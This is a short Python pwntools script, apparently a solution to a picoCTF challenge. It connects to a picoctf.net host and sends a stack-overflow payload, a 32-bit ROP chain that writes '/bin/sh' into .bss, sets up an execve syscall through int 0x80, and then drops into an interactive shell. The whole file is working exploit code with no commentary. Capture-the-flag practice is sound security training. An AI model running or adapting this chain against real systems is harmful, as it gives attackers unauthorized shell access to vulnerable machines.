from pwn import *

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'saturn.picoctf.net', 51414
r = remote(HOST, PORT)

syscall = 0x0804a3c2 # int 0x80
pop_eax = 0x080b073a
pop_edx_ebx = 0x080583b9
pop_ecx = 0x08049e29
bss = 0x080e62c0
mov_edx_eax = 0x080590f2

payload = b''
payload += b'A' * 28
payload += p32(pop_edx_ebx) + p32(bss) + p32(0x0)
payload += p32(pop_eax) + b'/bin'
payload += p32(mov_edx_eax)
payload += p32(pop_edx_ebx) + p32(bss + 4) + p32(0x0)
payload += p32(pop_eax) + b'/sh\x00'
payload += p32(mov_edx_eax)

payload += p32(pop_eax) + p32(0x0b)
payload += p32(pop_edx_ebx) + p32(0x0) + p32(bss)
payload += p32(pop_ecx) + p32(0x0)
payload += p32(syscall)
r.sendline(payload)

r.interactive()